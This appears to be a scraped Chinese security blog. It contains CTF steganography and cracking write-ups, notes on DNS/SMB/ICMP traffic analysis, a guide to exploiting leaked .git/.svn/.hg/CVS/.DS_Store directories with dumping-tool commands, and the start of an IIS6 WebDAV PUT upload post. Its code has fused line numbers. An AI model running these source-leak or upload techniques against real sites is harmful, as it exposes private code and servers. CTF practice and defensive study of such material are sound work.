&quot;1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011&quot;print(len(str))i=0for y in range (0,MAX*9,9): for x in range (0,MAX*9,9): if(str[i] == &quot;1&quot;): for n in range(9): for j in range(9): pic.putpixel([x+j,y+n],(0,0,0)) else: for k in range(9): for l in range(9): pic.putpixel([x+l,y+k],(255,255,255)) i = i+1pic.show()pic.save(&quot;flag.png&quot;) FRP18 loli拿到类似二维码的图片尝试扫描。得到提示： tips:255。最后通过将图片转16进制和0xff异或，也就是将图片的16进制取反。使用winhex的异或功能。 最后拿到一张图片，图片中藏有一个png，并且图片最后有提示–black and wihite。 拿到图片之后是一些黑白组成的，当然考虑白1黑0进行转换，仔细观察发现一共被分成了11列，每一列都被白色分隔开，并且被分割成了50行，每一行都被黑色分割开。而且还发现每一列都是八个黑白色组成。脚本如下： 12345678910111213141516from PIL import Imageimg = Image.open(&#x27;flag.png&#x27;)width,height=img.sizecolor=&quot;&quot;for i in range(0,100,2): for j in range(11): for z in range(1,9): pixel = img.getpixel((9*j + z, i)) if pixel == (0, 0, 0): color += &quot;1&quot; else: color += &quot;0&quot;flag=&quot;&quot;for i in range(0,len(color),8): flag+=chr(int(color[i:i+8],2))print(flag) ais2{Black_n_White_vi5ual_crYPtoGraPhY} FRP09 Childhood memories拿到一个txt文件，文件首行begin 664 quiz。改为后缀rar，解压再次改为rar，拿到两张图片。使用Bcompare拿到flag。 CMP05 Not long enough一看就是CRC爆破，一开始使用好压压缩，每个文件为1kb，所以索性爆出1kb，但是没有爆出来。 1234567891011121314151617181920212223import zipfileimport binasciiimport strings=string.printablef = zipfile.ZipFile(&quot;1.zip&quot;)l = f.namelist()info=f.infolist()list_crc=[]for i in l: GetCrc = f.getinfo(i) crc = GetCrc.CRC list_crc.append(hex(crc))print(list_crc[3])for i in list_crc: for j in s: for a1 in s: for a2 in s: for a3 in s: for a4 in s: for a5 in s: flag=j+a1+a2+a3+a4+a5 if crc==(binascii.crc32(flag.encode())&amp;0xffffffff): print(flag) 但是发现爆破太慢了尝试工具。爆破六位crc使用以下工具： 1234567891011121314151617C:\\Users\\12521\\Desktop\\CTF脚本\\杂项\\压缩包\\crc32-master&gt;python3 crc32.py reverse 0x15b895884 bytes: &#123;0xc9, 0xbf, 0xd6, 0x30&#125;verification checksum: 0x15b89588 (OK)alternative: AKjKcy (OK)alternative: BVptH1 (OK)alternative: FRmuIR (OK)alternative: Ka6j7X (OK)alternative: ND4JDn (OK)alternative: SgZWO3 (OK)alternative: WcGVNP (OK)alternative: _iQ5Bx (OK)alternative: bYCMs4 (OK)alternative: c5qQli (OK)alternative: d093GV (OK)alternative: oKFBdr (OK)alternative: shint6 (OK)alternative: wltouU (OK) 之后爆破了许多文件内容，找到可以字符串，输入压缩包密码，拿到txt。 1]cX^r:X\\jXiV&#96;jVm\\ipV&#96;ek\\ijk&#96;e^t 拿到一串字符串，凯撒暴力破解拿到flag。 CMP09 Tails拿到一个压缩包，压缩包里面一个txt，提示flag不在这里，尝试ntfs隐写。拿到一个pyc文件，进行反编译。 1steady@steady:~/桌面/tools/python-uncompyle6-master/bin$ ./uncompyle6 1.pyc 123456789101112131415161718import base64def encode(): flag = &#x27;*************&#x27; ciphertext = [] for i in range(len(flag)): s = chr(i ^ ord(flag[i])) if i % 2 == 0: s = ord(s) + 10 else: s = ord(s) - 10 ciphertext.append(str(s)) return ciphertext[::-1]ciphertext = [ &#x27;96&#x27;, &#x27;65&#x27;, &#x27;93&#x27;, &#x27;123&#x27;, &#x27;91&#x27;, &#x27;97&#x27;, &#x27;22&#x27;, &#x27;93&#x27;, &#x27;70&#x27;, &#x27;102&#x27;, &#x27;94&#x27;, &#x27;132&#x27;, &#x27;46&#x27;, &#x27;112&#x27;, &#x27;64&#x27;, &#x27;97&#x27;, &#x27;88&#x27;, &#x27;80&#x27;, &#x27;82&#x27;, &#x27;137&#x27;, &#x27;90&#x27;, &#x27;109&#x27;, &#x27;99&#x27;, &#x27;112&#x27;] 写解密脚本 123456789101112ciphertext = [&#x27;96&#x27;, &#x27;65&#x27;, &#x27;93&#x27;, &#x27;123&#x27;, &#x27;91&#x27;, &#x27;97&#x27;, &#x27;22&#x27;, &#x27;93&#x27;, &#x27;70&#x27;, &#x27;102&#x27;, &#x27;94&#x27;, &#x27;132&#x27;, &#x27;46&#x27;, &#x27;112&#x27;, &#x27;64&#x27;, &#x27;97&#x27;, &#x27;88&#x27;, &#x27;80&#x27;, &#x27;82&#x27;, &#x27;137&#x27;, &#x27;90&#x27;, &#x27;109&#x27;, &#x27;99&#x27;, &#x27;112&#x27;]ciphertext = ciphertext[::-1]print(ciphertext)flag=&quot;&quot;for num,key in enumerate(ciphertext): if num % 2 == 0: key = int(key) - 10 else: key = int(key) + 10 flag+=chr(num ^ key)print(flag) FRP14 Watermark2盲水印 1python3 bwmforpy3.py decode hui.png hui_with_wm.png flag.png --oldseed FRP13 Watermark频域盲水印 1python2 &#x2F;root&#x2F;桌面&#x2F;steady&#x2F;1.py --original ori.png --image res.png --result out.png 网题杂项男神拿到两张图片，想到盲水印，但是先使用stegsolve试试。使用image conbine功能在SUB处发现了二维码，使用扫描工具扫描不出来，这时候想到修补二维码。但是没法修补，再次尝试stegsolve。 将图片保存为bmp，继续使用stegsolve。在Red plane 0、Green plane 0、Blue plane 0分别发现三张二维码，导出，扫描，拿到flag。 enc使用stegsolve，发现Red plane 0全是黑色，于是把Alpha plane 0、Red plane 0、Green plane 0、Blue plane 0都保存下来。分别将Alpha plane 0、Red plane 0、Green plane 0、Blue plane 0另存为 a.png、r.png、g.png、b.png。 发现用StegSolve打开 a.png，Image Combiner打开 g.png，两者进行的异或运算能得到flag。这里一定要注意打开顺序，先打开a.png，然后在打开g.png。 zsteg使用zsteg 1root@root:~&#x2F;桌面&#x2F;flag&#x2F;套娃# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;套娃&#x2F;2&#x2F;3&#x2F;4&#x2F;5&#x2F;6&#x2F;warmup.bmp&#39; 没有检测到东西，尝试使用--all参数。 发现某些编码。 123b1,r,msb,Xy .. text: &quot;..?. !?.?. ..... ..... ..... ....? .!!?! ..... ..... ..... ....... ..!!! !!?.! ?.?!! !!!!? .!!?! ..... ..?.! ..... .....\\n...!. . .?.!. ..... ..?.! ?.?.. ..... .?.!! ?!... .....\\n.?.!. ..... ......? .!!!! !.!!! !!!!! !!!!! !!?.! ?.?!!\\n!!!!! !?.!! ?!... .....&quot;b1,g,msb,Xy .. text: &quot;.koO .koO .koO .koO .koO .koO .koO .koO .koO .koO .koO .koO .koOkoO .koO .koO .koO .koO .koO ?koO .koO !koO !koO ?koO\\n!koO .koO oO !koO ?koO .koO ?koO .koO .koO .koO .koO\\n.koO .koO .koO .koO .O .koO .koO .koO .koO .koO .koO\\n.koO .koO .koO .koO .koO ?koO .k&quot;b1,b,msb,Xy .. text: &quot;[+++ +++&lt;. --.+&gt; ]&lt;+++ &gt;-[++ +&lt;.++ +++++ ++&gt;]&lt; +++++ +&gt;-[+ +++++.- ----. --.-- --&gt;]&lt; ----- -&gt;-[+ +++++ &lt;.+++ +++++ &gt;]&lt;++\\n++++&gt; - ----- &gt;]&lt;-- ----&gt; -[+++ +++&lt;. ---.+ ++&gt;]&lt; +++++\\n++&gt;-[ +++++ ++&lt;+++&gt; -[+++ ++&lt;.+ +++++ +++++ +&gt;]&lt;+ +++++\\n&gt;-[++ ++++&lt; .--.. -----&quot; 但是数据不完整，使用limit参数加长数据。 1$ zsteg warmup.bmp b1,r,lsb,xy -l 2048 分别提取ok、！ pyflag拿到三个图片，发现三个图片中都有PK字样，应该是藏有zip，然后在每个文件的末尾发现了SecretFile/.hint.txt，使用string 挨个查一下。 123456789101112steady@steady:~/桌面/tools$ strings /home/steady/桌面/tools/Furan.jpg | grep &quot;Secret&quot;[Secret File Part 2:]SecretFile/steady@steady:~/桌面/tools$ strings /home/steady/桌面/tools/Setsuna.jpg | grep &quot;Secret&quot;[Secret File Part 1:]PKSecretFile/PKSecretFile/.hint.txtSecretFile/flag.txtsteady@steady:~/桌面/tools$ strings /home/steady/桌面/tools/Miku.jpg | grep &quot;Secret&quot;[Secret File Part 3:]SecretFile/.hint.txtSecretFile/flag.txt 可以看到很明显的标出每个图片是压缩包的第几部分。一开始是找到压缩包的敏感十六进制比如504B0304 ，剪贴下来之后发现文件错误，重新观察一下，发现png文件尾部FFD9，后面都会有一串字符串，字符串之后的就是我们的压缩包数据。 Setsuna.jpg，504B0102，很明显是压缩包的头部。 123456789101112131415161718192021222324252650 4B 03 04 14 00 00 00 00 00 54 88 6C 50 00 0000 00 00 00 00 00 00 00 00 00 0B 00 00 00 53 6563 72 65 74 46 69 6C 65 2F 50 4B 03 04 14 00 0900 08 00 74 86 6C 50 F9 1A 23 EB DF 00 00 00 E300 00 00 14 00 00 00 53 65 63 72 65 74 46 69 6C65 2F 2E 68 69 6E 74 2E 74 78 74 D2 D0 98 8C 5964 4C 2A 21 4D 96 C0 5F 09 FE 93 67 3A 9D 5D FE1C C9 8E 6A 97 D9 F3 48 D5 FD 22 F0 36 F6 9F 89C1 F9 3E A2 00 DC 69 B0 FD 3E 58 3D 20 A3 6F 6B0A 66 63 EC B8 D9 22 93 63 A4 55 35 28 4C 51 2AA9 BD A8 86 09 B1 70 E5 52 D0 78 29 3C 95 FD AB42 97 9A DA E1 63 A9 6F FA 86 CD C9 0B 34 F2 D368 1E A8 0F 67 4E 77 9D C6 BC 98 03 22 8D E5 24F6 3B 3E 93 11 0B 6E 2E 2E FB 38 9A 1F 40 47 A3D8 63 FD 32 9F AE C9 6A 42 E2 60 A7 5D 78 44 881D 21 F4 AC 20 88 2C 51 FD 99 8A 22 31 51 A5 DDA3 52 4E CD 82 FE 1D 0E 68 D7 B1 2D 6B 10 C5 8B29 C4 E3 D2 5C AE 86 54 C7 44 65 23 75 3D 42 5AFD E8 89 3D 70 B8 FB 07 A7 22 1F 1A EC 11 91 48D2 E0 6C FD EF 09 3D F2 A6 27 50 4B 03 04 14 0009 00 08 00 0B 87 6C 50 B6 2F 9E CA DF 00 00 0068 01 00 00 13 00 00 00 53 65 63 72 65 74 46 696C 65 2F 66 6C 61 67 2E 74 78 74 19 3A A9 27 8233 A6 C7 54 5D 93 5F D7 80 8E DB 94 73 47 BE 289D 22 38 6A 60 6F 28 B8 Furan.jpg 1234567891011121314151617E5 83 02 F6 3A 15 21 55 C7 1E 28 B5 33 55 AA BA36 46 8C A9 E4 26 D8 9B A9 C3 94 91 53 61 26 C2EF 38 3B CE CC 5C DF 25 B7 DF 48 5E F3 B8 E1 0289 1A F2 95 8F 49 52 EE DA BE 11 1B 10 5B 7E 830C 4D AB 6A DD 6E 24 18 D5 CE C1 E4 1B 6B 97 3666 5E 6A 13 41 37 FC CA E0 F6 A5 A7 4A C5 89 AD12 B2 0A AF BD CB AC 23 04 8C E9 44 3E C8 FE 4636 2F 8C 36 8C 81 F9 A6 61 9C B2 0E C1 9E B5 93A6 10 F9 00 DB 24 E5 F3 30 BC 19 EB 67 1C C6 4683 01 24 25 17 CC E3 84 C7 69 0D 09 04 73 E3 A9AC 84 57 1B B2 61 32 B0 AE 03 26 C4 A3 6F A3 4C3F 48 87 FB F0 D1 EC E3 10 F7 35 D8 27 22 DD 5699 90 50 4B 01 02 14 00 14 00 00 00 00 00 54 886C 50 00 00 00 00 00 00 00 00 00 00 00 00 0B 0024 00 00 00 00 00 00 00 10 00 00 00 00 00 00 0053 65 63 72 65 74 46 69 6C 65 2F 0A Miku.jpg 12345678910111213141516171800 20 00 00 00 00 00 01 00 18 00 81 37 39 FB 4CF8 D5 01 BB D9 0E FC 4C F8 D5 01 00 2E AD 19 36F8 D5 01 50 4B 01 02 14 00 14 00 09 00 08 00 7486 6C 50 F9 1A 23 EB DF 00 00 00 E3 00 00 00 1400 24 00 00 00 00 00 00 00 02 00 00 00 29 00 0000 53 65 63 72 65 74 46 69 6C 65 2F 2E 68 69 6E74 2E 74 78 74 0A 00 20 00 00 00 00 00 01 00 1800 A7 8A 4F 71 4B F8 D5 01 A8 8A 4F 71 4B F8 D501 00 B0 20 A8 34 F8 D5 01 50 4B 01 02 14 00 1400 09 00 08 00 0B 87 6C 50 B6 2F 9E CA DF 00 0000 68 01 00 00 13 00 24 00 00 00 00 00 00 00 8000 00 00 3A 01 00 00 53 65 63 72 65 74 46 69 6C65 2F 66 6C 61 67 2E 74 78 74 0A 00 20 00 00 0000 00 01 00 18 00 40 15 26 1A 4C F8 D5 01 02 5586 B3 4C F8 D5 01 63 FE 25 1A 4C F8 D5 01 50 4B05 06 00 00 00 00 03 00 03 00 28 01 00 00 4A 0200 00 00 00 之后尝试弱口令解压压缩包，密码是1234。解压之后拿到文本信息： 123我用各种baseXX编码把flag套娃加密了，你应该也有看出来。但我只用了一些常用的base编码哦，毕竟我的智力水平你也知道...像什么base36base58听都没听过提示：0x10,0x20,0x30,0x55 hint已经提示了使用base16,32,64,85的编码。 使用脚本解密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import base64import redef baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: passdef detect(text): try: if re.match(&quot;^[0-9A-F=]+$&quot;,text.decode()) is not None: return 1 except: pass try: if re.match(&quot;^[A-Z2-7=]+$&quot;,text.decode()) is not None: return 2 except: pass try: if re.match(&quot;^[A-Za-z0-9+/=]+$&quot;,text.decode()) is not None: return 3 except: pass return 4def autoDec(text): while True: if b&quot;MRCTF&#123;&quot; in text: print(&quot;\\n&quot;+text.decode()) break code = detect(text) text = baseDec(text,code)flag=b&quot;G&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)&quot;autoDec(flag) 不眠之夜拿到许多图片，每个图片有红色的字体，想到拼接图片。 使用kali工具。 随机拼接图片 12345root@root:~/桌面/不眠夜之WA# montage *jpg -tile 10x12 -geometry 200x100+0+0 out.jpgmontage: Not a JPEG file: starts with 0x00 0x00 `06b66ba.jpg&#x27; @ error/jpeg.c/JPEGErrorHandler/342.montage: delegate library support not built-in &#x27;/usr/share/fonts/type1/gsfonts/n019003l.pfb&#x27; (Freetype) @ warning/annotate.c/RenderFreetype/1836.montage: geometry does not contain image `/tmp/magick-JJP2g7mFGSZHQRZrEpMpVSqzm9hZg4A1&#x27; @ warning/attribute.c/GetImageBoundingBox/510.montage: geometry does not contain image `/tmp/magick-JJP2g7mFGSZHQRZrEpMpVSqzm9hZg4A1&#x27; @ warning/transform.c/CropImage/645. 整合图片 123456789101112131415root@root:~/桌面/不眠夜之WA# gaps --image=out.jpg --generations=50 --population=120 --size=100=== Population: 120=== Generations: 50=== Piece size: 100 px=== Pieces: 240=== Analyzing image: ██████████████████████████████████████████████████ 100.0% === Solving puzzle: █████████████------------------------------------- 26.5% === GA terminated=== There was no improvement for 10 generations=== Done in 11.960 s=== Close figure to exit Hello_Misc一张图片、一个压缩包，图片有点像stegsolve处理过的，放入stegsolve查看。一开始想到的是Data Extract数据提取，索性直接使用zsteg，查看到隐藏了一个压缩包。 123456789101112131415161718192021root@root:~/桌面/flag# zsteg &#x27;/root/桌面/flag/try to restore it.png&#x27; [?] 294 bytes of extra data after image end (IEND), offset = 0x578dextradata:0 .. file: Zip archive data, at least v2.0 to extract 00000000: 50 4b 03 04 14 00 09 00 63 00 7b 9e 78 50 3e a0 |PK......c.&#123;.xP&gt;.| 00000010: 43 2a 6c 00 00 00 96 01 00 00 07 00 0b 00 6f 75 |C*l...........ou| 00000020: 74 2e 74 78 74 01 99 07 00 01 00 41 45 03 08 00 |t.txt......AE...| 00000030: 81 1e 0a f2 f2 e6 76 47 b3 bb 97 11 74 be fe 37 |......vG....t..7| 00000040: 72 32 b0 0b 53 66 c5 84 dd 96 83 fe 64 b5 d5 ce |r2..Sf......d...| 00000050: 93 34 54 63 d8 81 17 8e 0e 09 fb 7f 68 05 a3 30 |.4Tc........h..0| 00000060: 52 06 31 20 7b 44 74 02 1f a9 70 e4 00 7e 63 be |R.1 &#123;Dt...p..~c.| 00000070: 60 ce ba 24 bc a5 d6 c4 eb 79 f8 76 e2 fa 96 c1 |`..$.....y.v....| 00000080: 64 ee 6f 3e 0a fd 9e 4b dd e1 23 bf 72 c4 a4 bd |d.o&gt;...K..#.r...| 00000090: 9e 3d 4b b1 60 0c 7e d4 b3 16 62 c4 50 4b 07 08 |.=K.`.~...b.PK..| 000000a0: 3e a0 43 2a 6c 00 00 00 96 01 00 00 50 4b 01 02 |&gt;.C*l.......PK..| 000000b0: 1f 00 14 00 09 00 63 00 7b 9e 78 50 3e a0 43 2a |......c.&#123;.xP&gt;.C*| 000000c0: 6c 00 00 00 96 01 00 00 07 00 2f 00 00 00 00 00 |l........./.....| 000000d0: 00 00 20 00 00 00 00 00 00 00 6f 75 74 2e 74 78 |.. .......out.tx| 000000e0: 74 0a 00 20 00 00 00 00 00 01 00 18 00 fb b2 95 |t.. ............| 000000f0: 9d d2 01 d6 01 fd 99 a2 9f d2 01 d6 01 fb b2 95 |................|b1,r,lsb,xy .. file: PNG image data, 526 x 298, 8-bit/color RGB, non-interlacedb1,bgr,msb,xy .. text: &quot;C2dB2IH&amp;$&quot; 直接binwalk分离出一个压缩包，但是需要密码。接着返回到stegsolve，图片是红色的，直接Data Extract提取red 0通道。 拿到一张图片，然后得到压缩包密码，解压之后拿到一个txt，里面有许多数据，其中有255、127，联想到二进制。而且只有四个数字。四个数字尝试转化成二进制，最高位分别是01，11，00，10，后面的都一样，尝试提取前两位数，八个一组转化成ascii。 1234567891011121314151617181920212223import re fp = open(&#x27;out.txt&#x27;,&#x27;r&#x27;)a = fp.readlines()p = []for i in a: p.append(int(i))s = &#x27;&#x27;for i in p: if i == 63: a = &#x27;00&#x27; elif i == 127: a = &#x27;01&#x27; elif i == 191: a = &#x27;10&#x27; elif i == 255: a = &#x27;11&#x27; s += a d = re.findall(r&#x27;.&#123;8&#125;&#x27;, s)o = &#x27;&#x27;for i in d: o += chr(int(i, 2))print(o) 拿到flag–rar-passwd:0ac1fe6b77be5dbe。 解压之后拿到一个zip，打开之后发现是一个word文档，修改为doc，空白处有字符串复制放到sublim中。 123456MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAxMTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDExMTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTExMTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTExMTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTExMTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx 尝试base64解密，拿到一串0或者1。在word中把1替换为空格，一定要替换为空格，不要替换为空。发现出现的图形不是flag。然后尝试把每一个行进行base64解码。先把word中的文字变成比较能看看到的数字。然后每一行base64解码。替换1，得到flag。","categories":[{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/categories/CTF-%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"CTF-杂项","slug":"CTF-杂项","permalink":"http://s1eady.top/tags/CTF-%E6%9D%82%E9%A1%B9/"}]},{"title":"流量分析","slug":"流量分析--协议学习","date":"2019-05-02T01:21:46.000Z","updated":"2020-10-20T11:35:03.847Z","comments":true,"path":"2019/05/02/流量分析--协议学习/","link":"","permalink":"http://s1eady.top/2019/05/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90--%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"流量分析DNSDNS即Domain Name System，域名系统，作为Internet的一个重要组成部分，和常用的协议。DNS采用53端口基于UDP协议，当数据量大时，采用TCP协议。DNS协议的作用是把域名解析到IP地址，或者实现不通域名的跳转等等。在网络安全中也常用DNS数据包作为信息的载体，以绕过防火墙等安全设施。 DNS的作用就是发送请求，收到对应域名的IP地址。但是DNS并不是一次发包，一次收回。而是需要发很多次，每一次发包都有一个十六进制数据，有利于区别是否是同一次发包。 请求包 TXT记录，可以用来隐藏一些信息，常用于反垃圾邮件。 响应包 CTF与DNSflag通常藏在解析的域名中，拼接所有解析域名，然后进行对应的解码。 也有可能藏在TXT记录中。 SMB概述SMB(全称是Server Message Block)是一个协议名，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。通过 SMB 协议，客户端应用程序可以在各种网络环境下读、写服务器上的文件，以及对服务器程序提出服务请求。通过 SMB 协议，应用程序可以访问远程服务器端的文件、以及打印机等资源。SMB 使用下列端口：TCP/139、TCP/445。 Wireshark与SMB首先客户端发送一个SMB negotiate protocol request请求数据报，并列出它所支持的所有SMB协议版本。 服务器收到请求信息后响应请求，并列出希望使用的协议版本。如果没有可使用的协议版本则返回0XFFFFH。 协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送session setup request请求数据报实现的。客户端发送一对用户名和密码或一个简单密码到服务器。 当客户端和服务器完成了磋商和认证之后，它会发送一个Tree connect rerquest SMB数据报并列出它想访问网络资源的名称。 之后服务器会发送一个tree connect response应答数据报以表示此次连接是否被接受或拒绝 连接到相应资源后，SMB客户端就能够干一些读、写(需要有权限)等操作了。 对于传输的文件，可以直接使用wireshark打开。 CTF与SMBflag通常藏在传输的文件中。 ICMPCTF与ICMP ICMP数据包中的data字段可能藏有flag。另外Ping命令的TTL值也需要格外关注一下，frame.len、data.len的长度也要多注意一下，比较快捷的做法就是直接搜索flag这些敏感字段(一个字符一个字符搜索)，根据规律判断某一个数据对应的字符串是否为flag。","categories":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CTF-流量分析","slug":"CTF-流量分析","permalink":"http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}]},{"title":"源码泄漏","slug":"源码泄漏总结","date":"2019-05-02T01:21:46.000Z","updated":"2020-10-26T02:23:39.445Z","comments":true,"path":"2019/05/02/源码泄漏总结/","link":"","permalink":"http://s1eady.top/2019/05/02/%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%80%BB%E7%BB%93/","excerpt":"","text":".git源码泄漏Git是目前世界上最先进的分布式版本控制系统。主要作用就是用来记录我们更改之后的代码，而不必每次都去重写代码。 1在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 漏洞利用探测：URL/.git/ 工具：GitHack.py http://www.steady.org/.git/ Mercurial/hgMercurial 是一个小型但强大的分布式 VCS 系统。 由于 Mercurial 的分布式性质，很容易在本地操作项目、通过本地提交跟踪并管理自己的更改以及在需要时把这些更改推到远程存储库。 漏洞利用探测：URL/.hg/ 工具：rip-hg.pl -v -u http://www.steady.com/.hg/ WEB-INF/web.xml 泄露WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 Tomcat的WEB-INF目录，每个j2ee的web应用部署文件默认包含这个目录。我们在解决web服务器的性能缺陷以及做均衡负载或者完成一些分层结构的安全策略，在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。 WEB-INF目录 WEB-INF/web.xmlweb应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则。 WEB-INF/classes包含了站点所有用的class文件，包括servlet class和非servlet class WEB-INF/lib存放web应用需要的JAR文件 WEB-INF/src源码目录，按照包名结构放置各个java文件 WEB-INF/database.properties数据库配置文件 WEB-INF/tags存放了自定义标签文件 WEB-INF/jspjsp 1.2 一下版本的文件存放位置。 WEB-INF/jsp2存放jsp2.0以下版本的文件。 META-INF相当于一个信息包。 漏洞利用web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，Nginx不会去考虑配置其他类型引擎导致的安全问题而引入到自身的安全规范中来。 漏洞防御修改Nginx配置文件禁止访问WEB-INF目录。 SVN文件泄露Subversion，是一个开放源代码的版本控制系统。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射。 我们可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。 漏洞利用svnExploit 1python SvnExploit.py -u http://steady/.svn 常规源码泄漏网站源码放在web目录，直接访问对应路径即可下载源码。 1www.steady.com/www.steady.com.zip 漏洞利用常见文件后缀 .rar .zip .7z .tar.gz .bak .txt .old .temp CVS泄漏CVS是一个C/S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对CVS/Root以及CVS/Entries目录，直接就可以看到泄露的信息。 CSV项目在初始化(cvs checkout project)的时候, 会在project目录下创建一个名为CVS的目录，其中保存了各个文件的修改和commit记录. 通过此目录可以获取代码的历史版本， 其中两个关键文件为:CVS/Root和CVS/Entries, 分别记录了项目的根信息和所有文件的结构。 漏洞利用1bk clone http:&#x2F;&#x2F;url&#x2F;name dir 12wget -r --no-parent --mirror http:&#x2F;&#x2F;www.steady.com&#x2F;CVScd www.steady.com &amp;&amp; cvs diff * 1直接访问url 1dvcs-ripper （支持旧版和新版的svn，使用方法：rip-cvs.pl -v -u http:&#x2F;&#x2F;www.steady.com&#x2F;CVS&#x2F;） SWP文件泄露swp文件即swap文件，在编辑文件时产生的临时文件，为隐藏文件，如果文件未正常退出，该临时文件就会自动保存，文件名为**.xxx.swp** 漏洞利用1vim打开，打开命令：vim -r steady.php.swp bzr源码泄漏bzr也是个版本控制工具，bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为.bzr的隐藏目录, 同样暴露了源代码和用户信息。 漏洞利用dvcs-ripper 1rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F; .DS_Store文件泄漏.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。 在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 漏洞利用python ds_store_exp.py http://www.example.com/.DS_Store","categories":[{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"}]},{"title":"中间件漏洞","slug":"中间件漏洞总结","date":"2019-05-02T01:21:46.000Z","updated":"2020-10-26T02:22:47.658Z","comments":true,"path":"2019/05/02/中间件漏洞总结/","link":"","permalink":"http://s1eady.top/2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"","text":"中间件漏洞总结IISPUT漏洞最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。 IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。 漏洞介绍及成因IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本：IIS6.0 漏洞前提IIS 6.0开启了WebDAV并且拥有IIS来宾用户拥有写入权限，并且知道网站根目录。 漏洞复现1）开启WebDAV 和写权限 2）利用burp测试 